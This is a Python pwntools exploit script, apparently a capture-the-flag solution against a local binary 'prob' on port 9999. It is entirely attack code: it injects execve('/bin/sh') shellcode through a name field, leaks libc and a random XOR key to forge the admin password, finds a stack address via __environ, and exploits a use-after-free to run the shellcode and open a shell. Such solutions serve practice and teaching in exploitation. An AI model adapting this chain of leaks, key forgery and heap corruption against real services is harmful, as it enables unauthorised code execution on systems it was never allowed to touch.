from pwn import *

#p = process('./prob')
p = remote("localhost", 9999)
e = ELF("./prob")
libc = ELF("./libc")

# context.log_level = 'debug'

# gdb.attach(p)
context.terminal = ['tmux', 'splitw', '-h', '-F', '-P']

def create_mission(key, misson_class, priority_level):
    p.sendlineafter(b'number : ', b'1')
    p.sendlineafter(b'Enter your mission Key : ', key.encode())
    p.sendlineafter(b'Enter your mission class : ', misson_class.encode())
    p.sendlineafter(b'Enter your priority level : ', priority_level.encode())

def print_mission(idx):
    p.sendlineafter(b'number : ', b'2')
    p.sendlineafter(b'Enter index to print : ', idx.encode())
    
def delete_mission(idx, key):
    p.sendlineafter(b'number : ', b'3')
    p.sendlineafter(b'Enter index to delete : ', idx.encode())
    p.sendlineafter(b'Enter your key :', key.encode())

def exit():
    p.sendlineafter(b'number : ', b'4')

def admin_create(password, department):
    p.sendlineafter(b'number : ', b'123456789')
    p.sendlineafter(b'Enter admin password : ', password.encode())
    p.sendlineafter(b'Choice : ', b'1')
    p.sendlineafter(b'Enter your department : ', department.encode())

def admin_check_mission(password, idx):
    p.sendlineafter(b'number : ', b'123456789')
    p.sendlineafter(b'Enter admin password : ', password.encode())
    p.sendlineafter(b'Choice : ', b'2')
    p.sendlineafter(b'Enter index to check : ', idx.encode())

def admin_search_mission(password, addr, yn):
    p.sendlineafter(b'number : ', b'123456789')
    p.sendlineafter(b'Enter admin password : ', password.encode())
    p.sendlineafter(b'Choice : ', b'3')
    p.sendlineafter(b'Enter mission pointer address : ', addr.encode())
    p.sendlineafter(b'Do you want to delete this mission? (y/n) : ', yn.encode())

def admin_exit(password):
    p.sendlineafter(b'number : ', b'123456789')
    p.sendlineafter(b'Enter admin password : ', password.encode())
    p.sendlineafter(b'Choice : ', b'4')

shellcode = b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
key_xor = 0x4b46485350414345

# Insert shellcode 
log.info("[*] Insert shellcode")
p.sendlineafter(b'Enter your Code Name : ', shellcode)

# Create mission
log.info("[*] Create mission(Leak Libc)")
create_mission("1", "1", "21")
delete_key = 1 ^ key_xor

log.info("[*] Create mission(Leak Random Key)")
create_mission("1", "1", "25")

# leak Libc & Random Key
log.info("[*] Leaking libc & Random Key")
print_mission("0")
p.recvuntil(b"Expense : ")
leak_libc = int(p.recvline().strip())
print(f"[*] leak_libc: {hex(leak_libc)}")

libc_base = leak_libc - 0x2045c0
print(f"[*] libc_base: {hex(libc_base)}")

print_mission("1")
p.recvuntil(b"Expense : ")
random_key = int(p.recvline().strip())
print(f"[*] random Key: {hex(random_key)}")

# admin key
admin_key = random_key ^ key_xor
print(f"[*] admin_key: {hex(admin_key)}")

# Leak __environ
log.info("[*] Leaking __environ")
libc_environ = libc_base + libc.symbols['__environ']
print(f"[*] environ: {hex(libc_environ)}")

# Leak codeName Ptr
log.info("[*] Leaking codeName Ptr")
p.sendlineafter(b'Enter number : ', b'123456789')
p.sendlineafter(b'Enter admin password : ', str(admin_key).encode())
p.sendlineafter(b'Choice : ', b'3')
p.sendlineafter(b'Enter mission pointer address : ', str(hex(libc_environ)).encode())

p.recvuntil(b"Address: ")
__environ_ptr = int(p.recvline().strip(), 16)
print(f"[*] __environ_ptr: {hex(__environ_ptr)}")

codeName_ptr = __environ_ptr - 0x198
print(f"[*] codeName_ptr: {hex(codeName_ptr)}")

p.sendlineafter(b'Do you want to delete this mission? (y/n) : ', b'n')

# UAF & Exploit
log.info("[*] UAF & Exploit")
shellcode_addr = codeName_ptr ^ key_xor
create_mission(str(shellcode_addr), "1", "1")
delete_mission("2", str(codeName_ptr))

admin_create(str(admin_key), "1")

p.interactive()
